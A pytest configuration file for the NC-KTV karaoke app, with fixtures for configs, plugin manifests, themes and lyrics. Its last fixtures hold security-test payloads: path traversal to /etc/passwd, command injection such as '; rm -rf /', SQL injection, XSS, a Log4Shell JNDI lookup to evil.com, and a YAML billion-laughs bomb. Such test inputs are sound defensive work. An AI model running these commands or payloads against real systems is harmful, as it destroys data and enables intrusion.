"""
pytest configuration and shared fixtures for NC-KTV tests
"""

import pytest
import sys
from pathlib import Path
import tempfile
import shutil

# Add src directory to Python path
sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))


@pytest.fixture
def temp_dir():
    """Create a temporary directory for tests"""
    temp_path = Path(tempfile.mkdtemp())
    yield temp_path
    # Cleanup
    if temp_path.exists():
        shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture
def sample_config():
    """Sample configuration dictionary"""
    return {
        'uvr': {
            'models_path': 'models/',
            'use_gpu': True
        },
        'gui': {
            'theme': 'builtin-dark'
        },
        'plugins': {
            'enabled': []
        }
    }


@pytest.fixture
def sample_plugin_manifest():
    """Sample plugin manifest"""
    return {
        "id": "com.test.plugin",
        "name": "Test Plugin",
        "version": "1.0.0",
        "author": "Test Author",
        "description": "Test plugin for testing",
        "type": "effect",
        "permissions": ["render"],
        "entry_point": "main.py",
        "dependencies": {
            "nc-ktv": ">=0.10.0"
        }
    }


@pytest.fixture
def sample_theme_yaml():
    """Sample theme YAML content"""
    return """
metadata:
  id: "test-theme"
  name: "Test Theme"
  author: "Test Author"
  version: "1.0.0"
  description: "Theme for testing"

ui:
  colors:
    background: "#1a1a1a"
    foreground: "#ffffff"
    primary: "#2196F3"
    accent: "#FF9800"
    success: "#4CAF50"
    warning: "#FF9800"
    error: "#F44336"
  
  fonts:
    family: "Arial"
    size: 10
  
  styles:
    button_primary: "background-color: {colors.success}; color: white;"

karaoke:
  styles:
    - name: "Test Style"
      font_family: "Arial"
      font_size: 60
      active_color: "#FFD700"
      inactive_color: "#FFFFFF"
      outline_color: "#000000"
      outline_width: 2.0
      animation: "linear_wipe"
"""


@pytest.fixture
def sample_lyrics():
    """Sample lyrics data"""
    return [
        {"text": "First line", "start_time": 0.0, "end_time": 2.0},
        {"text": "Second line", "start_time": 2.5, "end_time": 4.5},
        {"text": "Third line", "start_time": 5.0, "end_time": 7.0}
    ]


@pytest.fixture
def malicious_inputs():
    """Collection of malicious/edge case inputs for security testing"""
    return {
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/passwd',
            'C:\\Windows\\System32',
            '....//....//....//etc/passwd'
        ],
        'command_injection': [
            '; rm -rf /',
            '| cat /etc/passwd',
            '&& del /f /s /q C:\\*',
            '$(malicious_command)',
            '`malicious_command`'
        ],
        'buffer_overflow': [
            'A' * 1000000,  # 1MB
            'B' * 10000000,  # 10MB
            '\x00' * 100000  # Null bytes
        ],
        'unicode_bombs': [
            '\u0000' * 1000,  # Null characters
            '\uffff' * 1000,  # Max Unicode
            '🔥' * 10000,  # Emoji bomb
            '\u202e' * 100,  # RTL override
        ],
        'special_chars': [
            '"; DROP TABLE users; --',
            '<script>alert("XSS")</script>',
            '{{7*7}}',  # Template injection
            '${jndi:ldap://evil.com/a}',  # Log4Shell
        ]
    }


@pytest.fixture
def yaml_bomb():
    """YAML billion laughs attack"""
    return """
a: &a ["a","a","a","a","a","a","a","a","a"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
"""
